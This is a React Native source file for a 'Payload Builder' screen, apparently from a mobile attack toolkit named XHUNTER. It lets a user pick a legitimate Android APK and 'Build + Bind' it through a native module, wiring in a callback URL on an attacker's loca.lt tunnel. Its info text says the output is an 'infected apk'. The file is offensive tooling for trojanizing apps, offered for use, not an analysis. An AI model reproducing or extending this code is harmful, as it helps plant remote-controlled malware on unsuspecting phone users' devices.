import React, { useState } from "react";
import { 
    Box,
    StatusBar,
    HStack,
    IconButton,
    Icon,
    Text,
    Button,
    useToast,
    Spacer
} from "native-base";
import DocumentPicker from 'react-native-document-picker'
import RNFetchBlob from 'react-native-fetch-blob'
import MaterialCommunityIcons from 'react-native-vector-icons/MaterialCommunityIcons';
import FontAwesome from 'react-native-vector-icons/FontAwesome';
import { TouchableOpacity } from "react-native";
// native module
import AppBuilder from '../../native-modules/AppBuilder'
// redux
import { useDispatch, useSelector } from '../../redux/store';
import { addBuildPayloadLogs } from '../../redux/slices/userInfo'
// components
import BuildLogScreen from '../../components/BuildLogScreen'

const PayloadBuilder = ({navigation}) => {
    const toast = useToast();
    const dispatch = useDispatch();
    const { subdomain } = useSelector((state) => state.userInfo);

    const [targetApk,setTargetApk]=useState();
    const [visible, setVisible]= useState(false);

    const addlog =( type, message ) => { 
        dispatch(addBuildPayloadLogs({ type, message})) 
    }

    const handleBrowse =async()=>{
        try {
        const pickerResult = await DocumentPicker.pickSingle({
            presentationStyle: 'fullScreen',
            copyTo: "documentDirectory",
          })
          if(pickerResult.name.endsWith(".apk")){
              setTargetApk(pickerResult)
          }else{
            toast.show({
                title: "Wrong file selected",
                status: "error",
                placement: "top",
                description: "Please select *.apk file"
              })
          }
        } catch (e) {
            console.log(e)
          }
    }

    const handleAppBuilder = async()=>{
        if(!targetApk){
            toast.show({
                title: "No target apk selected",
                status: "error",
                placement: "top",
                description: "Please select *.apk file"
              })
         }else{
            RNFetchBlob.fs.stat(targetApk.uri).then((stats) => { 
                if(stats.path){
                    setVisible(true)
                    AppBuilder.build(stats.path,`https://${subdomain}.loca.lt`, addlog);
                }else{
                    toast.show({
                        title: "Target apk selected corrupt",
                        status: "error",
                        placement: "top",
                        description: "Please select *.apk file again"
                      })
                }
                }).catch((err) => {
                    toast.show({
                        title: "Target apk selected corrupt",
                        status: "error",
                        placement: "top",
                        description: "Please select *.apk file again"
                      })
                    console.log(err)
                });
        }
      }
    
  return (
    <>
    <StatusBar translucent backgroundColor={"transparent"} barStyle="light-content" />
    <Box  safeAreaTop  bg={"primary"} />

    <Box flex={1} bg={"primary"} px={'2'} >
    <HStack my="4" alignItems="center" justifyContent={'space-between'} borderBottomWidth="1" borderBottomColor={'secondary.500'} >
      <IconButton 
         onPress={()=>navigation.goBack()}
         icon={<Icon as={MaterialCommunityIcons} name="chevron-left-circle" />} 
         borderRadius="full" 
         _icon={{ color:  "tertiary.500", size: "sm"}} 
         _pressed={{ bg: "tertiary.800:alpha.20"}}            
         />
        <Box flex={1} flexDirection={'row'} justifyContent="center">
            <Text fontSize={'20'}  color={"secondary.500"}>Payload Builder</Text>
        </Box>
    </HStack>

    {targetApk&&<Box bg="dark.100" borderRadius='10' px="2"  py="4" mb='4' >
        <HStack justifyContent="space-between" alignItems={'center'}>
            <Icon as={FontAwesome} name={"android"} color={"success.500"} size="8" mr="1"/>
            <Text fontSize={'14'}  color={"secondary.500"}>{targetApk.name}</Text>
            <Spacer/>
            <IconButton 
            onPress={()=>setTargetApk()}
            icon={<Icon as={MaterialCommunityIcons} name="close-circle" />} 
            borderRadius="full" 
            _icon={{ color:  "error.500", size: "sm"}} 
            _pressed={{ bg: "error.800:alpha.20"}}           
         />
        </HStack>
    </Box>}
    {!targetApk&&<TouchableOpacity  onPress={handleBrowse} >
        <Box bg="dark.100" borderRadius='10' borderWidth={1} borderStyle="dashed" borderColor="tertiary.500" mx={"6"} py="10" mb='4' >
            <Text fontSize={'16'} textAlign="center" color={"secondary.500"}>DRAG TARGET APK HERE</Text>
            <Text fontSize={'16'} textAlign="center" color={"secondary.500"}>OR BROWSE</Text>
        </Box>
    </TouchableOpacity>}
    <Box bg="dark.100" borderRadius='10' px="2"  py="4" mb='4' >
        <Text fontSize={'16'}  color={"info.500"}>{"Information:"}</Text>
        <Text fontSize={'14'}  color={"error.600"}>{"*Select apk which is less in size for fast build.  [ size < 30MB ]"}</Text>
        <Text fontSize={'14'}  color={"error.600"}>{"*It may sometime takes long time to build apk depending on your mobile benchmark"}</Text>
        <Text fontSize={'14'}  color={"error.600"}>{"*Please be patient during apk build, as it usually takes few minutes to complete"}</Text>
        <Text fontSize={'14'}  color={"error.600"}>{"*If it fails to build apk them try another apk"}</Text>
        <Text fontSize={'14'}  color={"error.600"}>{"*It takes around 10-20 minutes to build. [ may differ on apk size ]"}</Text>
        <Text fontSize={'14'}  color={"error.600"}>{"*After build success, the infected apk will be located in \"XHUNTER\\payload\" named folder in your internal storage "}</Text>
    </Box>
    <Spacer/>
    <Button variant={'subtle'} onPress={handleAppBuilder} colorScheme={'tertiary'} size={'lg'} mb="10" borderRadius={16} leftIcon={<Icon as={MaterialCommunityIcons} name="hammer-wrench" size="sm" />}>
     {'Build + Bind'}
    </Button>
    </Box>
    <BuildLogScreen visible={visible} navigation={navigation}/>
    </>
    )
};

export default PayloadBuilder;

  